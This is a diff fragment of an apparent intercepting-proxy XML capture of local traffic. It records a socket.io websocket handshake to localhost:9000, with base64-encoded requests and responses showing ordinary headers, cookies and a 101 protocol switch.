+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW46IGh0dHA6Ly9sb2NhbGhvc3Q6NDIwMA0KVmFyeTogT3JpZ2luDQpDb250ZW50LVR5cGU6IHRleHQvcGxhaW47IGNoYXJzZXQ9VVRGLTgNCkNvbnRlbnQtTGVuZ3RoOiAzMg0KRGF0ZTogVGh1LCAwMyBTZXAgMjAyNiAxODowMDoxOCBHTVQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCktlZXAtQWxpdmU6IHRpbWVvdXQ9NQ0KDQo0MHsic2lkIjoibXhoRnNfNWtYLXdkZGZWX0FBQloifQ==]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:30:18 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/socket.io/?EIO=4&transport=websocket&sid=1t_f3Q-DQmWFXPAIAABY]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/socket.io/?EIO=4&transport=websocket&sid=1t_f3Q-DQmWFXPAIAABY]]></path>
+    <extension>io/</extension>
+    <request base64="true"><![CDATA[R0VUIC9zb2NrZXQuaW8vP0VJTz00JnRyYW5zcG9ydD13ZWJzb2NrZXQmc2lkPTF0X2YzUS1EUW1XRlhQQUlBQUJZIEhUVFAvMS4xDQpIb3N0OiBsb2NhbGhvc3Q6OTAwMA0KQ29ubmVjdGlvbjogVXBncmFkZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNTAuMC4wLjAgU2FmYXJpLzUzNy4zNg0KVXBncmFkZTogd2Vic29ja2V0DQpPcmlnaW46IGh0dHA6Ly9sb2NhbGhvc3Q6OTAwMA0KU2VjLVdlYlNvY2tldC1WZXJzaW9uOiAxMw0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KQ29va2llOiB3ZWxjb21lYmFubmVyX3N0YXR1cz1kaXNtaXNzOyBjb29raWVjb25zZW50X3N0YXR1cz1kaXNtaXNzOyBjb250aW51ZUNvZGU9Njdnd3JKV1o3bGVSRW9EeU5iNDFPVnBROEdtdlNqamhuejB2elhLM3hqcTY1TWtMQm5hOTJtWVBnanI5OyBsYW5ndWFnZT1lbg0KU2VjLVdlYlNvY2tldC1LZXk6IC9aZ0N4WXhMREFnSXVVcFVwdEFBY0E9PQ0KDQo=]]></request>
+    <status>101</status>
+    <responselength>129</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMTAxIFN3aXRjaGluZyBQcm90b2NvbHMNClVwZ3JhZGU6IHdlYnNvY2tldA0KQ29ubmVjdGlvbjogVXBncmFkZQ0KU2VjLVdlYlNvY2tldC1BY2NlcHQ6IGx1aU50bksrNkRnbnl1bDRzZytkdlEzdzY5dz0NCg0K]]></response>
     <comment></comment>
   </item>
 </items>
